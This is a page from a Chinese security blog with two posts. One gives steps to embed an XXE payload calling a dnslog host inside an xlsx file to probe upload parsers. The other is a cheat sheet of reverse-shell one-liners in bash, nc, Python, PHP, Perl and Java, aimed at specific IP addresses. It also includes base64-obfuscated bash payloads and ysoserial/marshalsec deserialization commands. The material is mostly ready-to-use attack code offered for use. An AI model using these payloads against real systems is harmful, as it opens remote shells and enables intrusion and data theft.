        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:54:50 / 修改时间：09:59:16" itemprop="dateCreated datePublished" datetime="2024-09-10T09:54:50+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="0x0-excel探测"><a href="#0x0-excel探测" class="headerlink" title="0x0 excel探测"></a>0x0 excel探测</h4><p>解压xlsx<br><img src="/images/blog/15cc9e50a61198544d367cda33d318ca.png"></p>
<p>编辑【[Content_Types].xml】文件<br><img src="/images/blog/377685cf4730c9d523794ddf911e57a9.png"></p>
<p>添加如下内容<br><img src="/images/blog/9b5f2f3579c1dbe80dcecaaf3bb70036.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM &quot;http://xxe.dnslog.icu/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
<p>进入文件目录，全选-&gt;7zip-&gt;添加到压缩包<br><img src="/images/blog/87700060e711bf6d2a00ca87c8668cee.png"></p>
<p>选择格式为【zip】等级为【仅存储】,更名为xlsx<br><img src="/images/blog/0182d5e51a95f7cc590e622d392fc68a.png"></p>
<p>把处理过后的文件上传，看到DNSLOG有没有请求过来</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">反弹shell命令总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:54:33 / 修改时间：09:54:38" itemprop="dateCreated datePublished" datetime="2024-09-10T09:54:33+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="0x0-bash反弹"><a href="#0x0-bash反弹" class="headerlink" title="0x0 bash反弹"></a>0x0 bash反弹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/204.44.66.210/5566 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>

<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f tmp/.a;mknod /tmp/.a p &amp;&amp; telnet 10.200.20.53 8899 0&lt;/tmp/.a|&amp; /bin/bash &gt;&amp; /tmp/.a;rm -f /tmp/.a</span><br></pre></td></tr></table></figure>

<h3 id="0x1-NC反弹"><a href="#0x1-NC反弹" class="headerlink" title="0x1 NC反弹"></a>0x1 NC反弹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 204.44.66.210 5566 </span><br></pre></td></tr></table></figure>

<h3 id="0x2-Python反弹"><a href="#0x2-Python反弹" class="headerlink" title="0x2 Python反弹"></a>0x2 Python反弹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.118.128&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.118.128&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-php反弹"><a href="#0x3-php反弹" class="headerlink" title="0x3 php反弹"></a>0x3 php反弹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="0x4-perl-反弹"><a href="#0x4-perl-反弹" class="headerlink" title="0x4 perl 反弹"></a>0x4 perl 反弹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="0x5-java反弹"><a href="#0x5-java反弹" class="headerlink" title="0x5 java反弹"></a>0x5 java反弹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h3 id="生成命令的工具网站："><a href="#生成命令的工具网站：" class="headerlink" title="生成命令的工具网站："></a>生成命令的工具网站：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jackson-t.ca/runtime-exec-payloads.html</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;bash -c &#123;echo,bmMgLWUgL2Jpbi9iYXNoIDIzLjEwNS4xOTMuMTA2IDc3Nzc=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure>


<h3 id="RMI反弹"><a href="#RMI反弹" class="headerlink" title="RMI反弹"></a>RMI反弹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://172.86.124.188:9998/#Exploit&quot; 1099</span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1389 CommonsCollections4 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43OC43LjU4Lzg4OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1389 CommonsCollections4 &#x27;bash -c &#123;echo,cGluZyAxMS5lLmRuc3h4LnRvcA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/7/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>

  <script class="next-config" data-name="pdf" type="application/json">{"object_url":{"url":"https://cdnjs.cloudflare.com/ajax/libs/pdfobject/2.3.0/pdfobject.min.js","integrity":"sha256-JJZNsid68vnh3/zyj0lY9BN5ynxVX/12XgOa1TlaYN0="},"url":"/lib/pdf/web/viewer.html"}</script>
  <script src="/js/third-party/tags/pdf.js"></script>




  <script src="/js/third-party/pace.js"></script>


  








</body>
</html>
